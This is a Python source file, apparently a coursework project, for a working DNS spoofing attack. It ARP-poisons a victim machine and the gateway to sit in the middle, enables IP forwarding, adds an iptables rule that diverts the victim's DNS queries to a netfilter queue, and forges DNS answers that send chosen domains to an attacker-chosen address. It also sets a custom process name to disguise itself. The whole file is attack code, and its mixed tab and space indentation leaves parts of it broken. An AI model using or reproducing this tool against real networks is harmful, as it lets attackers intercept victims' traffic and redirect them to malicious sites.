#	dns_spoof.py
#
#	Design and Program: Vishav Singh & Manuel Gonzales
#
#	functions:
#
#		def signal_handler(signum, frame)
#		def sniffer()
#		def get_address(interface, ip)
#		def start_mitm(interface, victim, gateway)
#		def parse(packet)
#		def redirectionRules(victim)
#		def getWebIP(website)
#		def main()
#
#	Program to spoof a DNS response to a victim machine, the way it works is that initially 
#	the program ARP poisons the victim into believing this system to be the gateway, This is
#	done in order to sniff traffic and manipulate the DNS responses the victim machines gets
#	to redirect them to a different website.
#

import setproctitle
import optparse
import signal
from netfilterqueue import NetfilterQueue
from multiprocessing import Process
from scapy.all import *
from scapy.layers.inet import IP, UDP, Ether


# Constants
CONST_DESTINATION_PORT = 53
CONST_DNS_SERVER = "8.8.8.8"


# Global
mitm_running = False
spoof_running = True
process_name = "None"	
websites = []	#websites array
new_website = "None"


# main function to parse the arguments and start the processes of MITM and to sniff traffic
def main():
    parser = optparse.OptionParser()

    parser.add_option("-i", "--interface", type="string", dest="interface",
                      help="[REQUIRED] Local Interface to Use")
    parser.add_option("-d", "--destination_ip", type="string", dest="destination_ip",
                      help="[REQUIRED] IP address to Sniff")
    parser.add_option("-r", "--router_ip", type="string", dest="router_ip",
                      help="[REQUIRED] IP address of the gateway/router")
    parser.add_option("-w", "--website", type="string", dest="website",
                      help="[REQUIRED] Website(s) to Spoof (Separated by commas)")
    parser.add_option("-n", "--new_website", type="string", dest="new_website",
                      help="[REQUIRED] Website to redirect to")
    parser.add_option("-t", "--title", type="string", dest="title",
                      help="[REQUIRED] Process name")

    (options, args) = parser.parse_args()

    if len(sys.argv) < 2:
        parser.error("Use -h or --help for instructions")

    if not options.interface or not options.destination_ip or not options.router_ip or not options.new_website or not options.website or not options.title:
        parser.error("Please fill in all the required parameters")

    global process_name
    global new_website
    global websites

    try:
		
        signal.signal(signal.SIGINT, signal_handler)
        setproctitle.setproctitle(options.title)
        process_name = options.title
		websites = options.website.split(",")
		new_website = getWebIP(options.new_website)
		conf.verb = 0
		redirectionRules(options.destination_ip)

    except Exception:

        print "Couldn't set options"
        return
    
        

    p1 = Process(target=start_mitm, args=(options.interface, options.destination_ip, options.router_ip))
    p1.start()

    p2 = Process(target=sniffer)
    p2.start()

    p1.join()
	p2.kill()

	
# Function to stop all the processes in a clean manner when SIGNINT(Ctl + C) is found.
# signum - type of signal caught
# frame - stack frame
def signal_handler(signum, frame):
    global spoof_running
    global process_name
    print ("Process %s is Stopping..." % process_name)
    spoof_running = False
    time.sleep(1)
    print ("Stopped %s" % process_name)
    sys.exit(0)


# Function to start the netfilter queue which gets all of the traffic to port 53 from the victim machine
# it then sends the packet for parsing. On stop if clears the firewall rules
def sniffer():

    global process_name
    setproctitle.setproctitle("sniffer")
    process_name = "sniffer"

    filterQueue = NetfilterQueue()
    filterQueue.bind(1, parse)

    try:

        filterQueue.run()

    except KeyboardInterrupt:

        filterQueue.unbind()
        os.system('iptables -t nat -F')
		os.system('iptables -t nat -X')

		
# Function to resolve the MAC address of a system in the network.
# interface - local interface in use
# ip - IP of system to resolve
def get_address(interface, ip):
    ans = srp1(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, iface=interface, inter=0.1)
    return ans[Ether].src


# Function to start ARP poisoning a victim system in order to be able to sniff all the traffic going 
# to it, and also be able to tamper some of the traffic.
# interface - local interface in use
# victim - IP of the system to attack
# gateway - IP of the gateway/router
def start_mitm(interface, victim, gateway):
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    global spoof_running
    global process_name
    setproctitle.setproctitle("mitm")
    process_name = "mitm"

    try:
        victim_address = get_address(interface, victim)
        gateway_address = get_address(interface, gateway)

        while spoof_running:
            send(ARP(op=2, pdst=victim, psrc=gateway, hwdst=victim_address))
            send(ARP(op=2, pdst=gateway, psrc=victim, hwdst=gateway_address))
            time.sleep(0.5)

        sys.exit(0)

    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print "Couldn't start MITM"
        return


# Function to parse the packets that get to the netfilter queue (trough the IP tables rule)
# It will check if the packet is a DNS request and if it is it will act accordingly if the 
# request is for one of the websites to be spoofed.
# packet - packet received to the queue
def parse(packet):

    global websites
    global new_website

    payload = packet.get_payload()
    pkt = IP(payload)    
    
    if not pkt.haslayer(DNSQR):

        packet.accept()

    else:

	for website in websites:

            if website in pkt[DNS].qd.qname:

                spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                              UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                              DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
                              an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=new_website))

				spoofed_pkt.show()
                packet.set_payload(str(spoofed_pkt))
                packet.accept()
		return

        packet.accept()

		
# Function to redirect all the DNS traffic from the victim system into the nefilter queue
# victim - IP of victim system
def redirectionRules(victim):

	os.system("iptables -t nat -A PREROUTING -p udp -s " + victim + " --dport " + str(CONST_DESTINATION_PORT) + " -j NFQUEUE --queue-num 1")


# Function to resolve the IP of a domain.
# website - domain name of website to redirect to
def getWebIP(website):

	answer = sr1(IP(dst=CONST_DNS_SERVER)/UDP(dport=CONST_DESTINATION_PORT)/DNS(rd=1,qd=DNSQR(qname=website)),verbose=0)

	data_number = answer.getlayer(DNS).ancount
	
	if data_number == 0: #domain not found
		return website

	new_ip = answer.getlayer(DNS).an[data_number-1].rdata
	return new_ip

	
# start script
main()
